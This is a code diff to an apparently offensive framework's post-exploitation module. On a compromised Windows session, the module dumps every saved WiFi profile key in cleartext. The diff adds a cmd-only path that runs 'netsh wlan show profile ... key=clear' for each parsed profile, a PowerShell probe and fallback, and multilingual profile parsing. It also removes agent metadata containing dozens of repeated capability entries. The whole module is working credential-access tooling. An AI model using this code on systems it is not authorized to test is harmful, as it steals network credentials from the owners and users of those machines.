@@ -4,6 +4,9 @@
 """
 Extract saved WiFi profile keys from a Windows shell or Meterpreter session using
 netsh wlan, then display and save the results under ./output.
+
+Works from cmd.exe sessions (no PowerShell required). Optional PowerShell path
+is kept as a fallback when available.
 """
 
 from kittysploit import *
@@ -13,6 +16,12 @@ import re
 import time
 
 _LOCAL_OUT = "output"
+
+_PROFILE_LINE = re.compile(
+    r"(?:All User Profile|Profil Tous les utilisateurs|"
+    r"Perfil de todos los usuarios|Benutzerprofil)\s*:\s*(.+)\s*$",
+    re.I,
+)
 
 
 class Module(Post):
@@ -28,67 +37,15 @@ class Module(Post):
         "references": [
             "https://attack.mitre.org/techniques/T1555/",
         ],
-    'agent': {
-        'risk': 'intrusive',
-        'effects': ['active_exploitation'],
-        'expected_requests': 3,
-        'reversible': False,
-        'approval_required': True,
-        'produces': ['risk_signals'],
-        'cost': 1.5,
-        'noise': 0.5,
-        'value': 1.0,
-        'requires':         {'min_endpoints': 0,
-         'min_params': 0,
-         'tech_hints_any': [],
-         'tech_hints_all': [],
-         'specializations_any': [],
-         'risk_signals_any': [],
-         'auth_session': False,
-         'capabilities_any': [],
-         'capabilities_all': [],
-         'confidence_min': {},
-         'confidence_min_any': {},
-         'endpoint_pattern_any': [],
-         'param_any': [],
-         'api_surface_ready': False},
-        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 's7comm', 'from_detail': ''},
-                                   {'capability': 'ot_assets', 'from_detail': ''},
-                                   {'capability': 'ot_assets', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''}],
-         'consumes_capabilities': [],
-         'option_bindings': {},
-         'suggested_followups': []},
-    },
     }
 
     save_local = OptBool(True, "Save wlankeys.txt under ./output", False)
+    prefer_powershell = OptBool(
+        False,
+        "Prefer PowerShell wrapper when available (default: netsh via cmd)",
+        False,
+        True,
+    )
 
     def _execute_cmd(self, command: str) -> str:
         if not command:
@@ -109,6 +66,18 @@ class Module(Post):
         if isinstance(val, bool):
             return val
         return str(val).strip().lower() in ("1", "true", "yes", "on")
+
+    def _powershell_available(self) -> bool:
+        # Try a few invocations — session framing can swallow a bare "1"
+        for cmd in (
+            'powershell -NoP -NonI -Command "Write-Output PS_OK"',
+            'powershell.exe -NoP -NonI -Command "Write-Output PS_OK"',
+            r'%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -Command "Write-Output PS_OK"',
+        ):
+            out = self._execute_cmd(cmd)
+            if out and "PS_OK" in out:
+                return True
+        return False
 
     def _powershell_script(self) -> str:
         return r"""
@@ -148,16 +117,54 @@ $ErrorActionPreference = 'Stop'
 Get-WiFiKeys
 """
 
-    def check(self):
-        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
-        if "1" not in ps_check:
-            print_error("PowerShell is not available on the target")
-            return False
+    def _parse_profile_names(self, profiles_out: str) -> list:
+        names = []
+        for line in (profiles_out or "").splitlines():
+            m = _PROFILE_LINE.search(line.strip())
+            if m:
+                name = m.group(1).strip()
+                if name:
+                    names.append(name)
+        # Preserve order, drop dupes
+        seen = set()
+        ordered = []
+        for n in names:
+            key = n.lower()
+            if key not in seen:
+                seen.add(key)
+                ordered.append(n)
+        return ordered
 
+    def _extract_via_netsh(self) -> str:
+        profiles_out = self._execute_cmd("netsh wlan show profiles")
+        if not profiles_out:
+            return ""
+        if re.search(r"netsh wlan show profiles failed|not supported|not available", profiles_out, re.I):
+            return f"netsh wlan show profiles failed: {profiles_out}"
+
+        names = self._parse_profile_names(profiles_out)
+        if not names:
+            return "No saved WiFi profiles found for the current user."
+
+        sections = []
+        for network in names:
+            # Escape embedded quotes for cmd
+            safe = network.replace('"', '""')
+            detail = self._execute_cmd(f'netsh wlan show profile name="{safe}" key=clear')
+            if not detail:
+                sections.append(f"=== Profile: {network} (failed / empty) ===")
+                continue
+            sections.append(f"=== Profile: {network} ===\n{detail}")
+        return "\n\n".join(sections)
+
+    def check(self):
         netsh_check = self._execute_cmd("where netsh")
         if not netsh_check or "netsh" not in netsh_check.lower():
-            print_error("netsh.exe is not available on the target")
-            return False
+            # Fallback: try invoking netsh directly
+            probe = self._execute_cmd("netsh /?")
+            if not probe or "wlan" not in probe.lower() and "show" not in probe.lower():
+                print_error("netsh.exe is not available on the target")
+                return False
 
         wlan_check = self._execute_cmd("netsh wlan show interfaces")
         if wlan_check and re.search(r"(not supported|not available|not present|n.est pas)", wlan_check, re.I):
@@ -177,10 +184,17 @@ Get-WiFiKeys
             raise ProcedureError(FailureType.NotCompatible, "WiFi key extraction prerequisites not met")
 
         print_status("Extracting saved WiFi profile keys...")
-        result = self._run_powershell(self._powershell_script())
+        use_ps = self._bool_opt(self.prefer_powershell, False) and self._powershell_available()
+        if use_ps:
+            print_info("Using PowerShell wrapper")
+            result = self._run_powershell(self._powershell_script())
+        else:
+            if self._bool_opt(self.prefer_powershell, False):
+                print_warning("PowerShell preferred but not available — falling back to netsh/cmd")
+            result = self._extract_via_netsh()
 
         if not result:
-            raise ProcedureError(FailureType.Unknown, "No output was returned by Get-WiFiKeys")
+            raise ProcedureError(FailureType.Unknown, "No output was returned by WiFi key extraction")
 
         if re.search(r"netsh wlan show profiles failed", result, re.I):
             print_error(result)
